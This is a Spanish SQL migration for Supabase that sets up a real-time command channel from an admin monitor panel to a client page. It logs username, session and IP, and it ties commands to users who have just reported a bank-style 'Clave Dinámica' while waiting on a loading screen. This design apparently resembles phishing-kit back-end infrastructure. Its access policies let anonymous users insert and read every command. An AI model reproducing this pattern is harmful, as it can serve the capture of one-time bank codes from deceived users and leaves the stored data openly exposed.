-- ============================================================
-- PUENTE ADMIN -> CLIENTE EN TIEMPO REAL
-- Tabla de comandos que el Panel Administrativo (monitor.js)
-- envía al cliente (home-realtime.js) vía Supabase Realtime.
-- Proyecto: yiozdjhcbragqmexiovn
-- ============================================================

-- TABLA: admin_commands
create table if not exists public.admin_commands (
  id bigint generated always as identity primary key,
  command text not null,
  username text,
  session_id text,
  ip text,
  status text default 'pending',
  created_at timestamptz default now()
);

alter table public.admin_commands enable row level security;

grant usage on schema public to anon, authenticated, service_role;
grant insert on table public.admin_commands to anon, authenticated, service_role;
grant select on table public.admin_commands to anon, authenticated, service_role;
grant usage, select on all sequences in schema public to anon, authenticated, service_role;

-- Politica INSERT (el panel escribe comandos)
drop policy if exists "allow_anon_insert_admin_commands" on public.admin_commands;
create policy "allow_anon_insert_admin_commands"
  on public.admin_commands
  as permissive
  for insert
  to anon, authenticated
  with check (true);

-- Politica SELECT (el cliente lee/comprueba los comandos dirigidos a él)
drop policy if exists "allow_anon_select_admin_commands" on public.admin_commands;
create policy "allow_anon_select_admin_commands"
  on public.admin_commands
  as permissive
  for select
  to anon, authenticated
  using (true);

-- Habilita Realtime (postgres_changes) para admin_commands:
-- entrega el comando al cliente casi al instante.
do $$
begin
  alter publication supabase_realtime add table public.admin_commands;
exception
  when duplicate_object then null;
  when undefined_object then null;
end $$;

-- Columna session_id en dynamic_keys: el cliente guarda su sesión al
-- reportar la Clave Dinámica, para que el panel pueda direccionar el
-- comando al usuario exacto que está esperando en la pantalla de carga.
alter table public.dynamic_keys add column if not exists session_id text;